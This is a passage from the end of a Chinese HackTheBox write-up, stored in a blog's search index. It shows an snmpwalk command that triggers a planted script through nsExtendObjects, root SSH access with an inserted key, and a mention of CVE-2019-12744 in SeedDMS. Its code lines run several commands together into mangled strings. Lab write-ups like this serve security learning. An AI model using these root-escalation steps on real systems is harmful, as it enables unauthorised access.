+<p>用snmpwalk加载所有内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects#-m MIB[:...]          load given list of MIBs (ALL loads everything)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmpcommand.png" alt="snmpcommand"></p>
+<p>接下来就可以用配对的密钥SSH连接root了，得到root.txt</p>
+<p>![ssh root](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh</a> root.png)</p>
+<p>写入密钥并连接的操作需要连贯的完成，因为目标Linux会定时删除<code>/monitoring</code>目录下的文件</p>
+<p><strong>注意！！运行snmpwalk前需要安装配置好snmp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install snmpcpan -i NetAddr::IPapt-get install snmp-mibs-downloadersudo download-mibs</span><br></pre></td></tr></table></figure>
+
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>总的做下来是学到了新知识的，以后信息收集的时候也会注意更多小细节</p>
+<p>在SeedDMS版本漏洞利用的点上是官方设计的问题，有文章没解释就说这里应该用<strong>CVE-2019-12744的漏洞</strong>我觉得这是非常不负责任的一件事情，我们应该抱着质疑的态度而不是文章怎么写就照着做</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.poftut.com/snmpwalk-command-line-examples/">https://www.poftut.com/snmpwalk-command-line-examples/</a></p>
+<p><a href="https://blog.csdn.net/dongwuming/article/details/9705595">https://blog.csdn.net/dongwuming/article/details/9705595</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+</search>
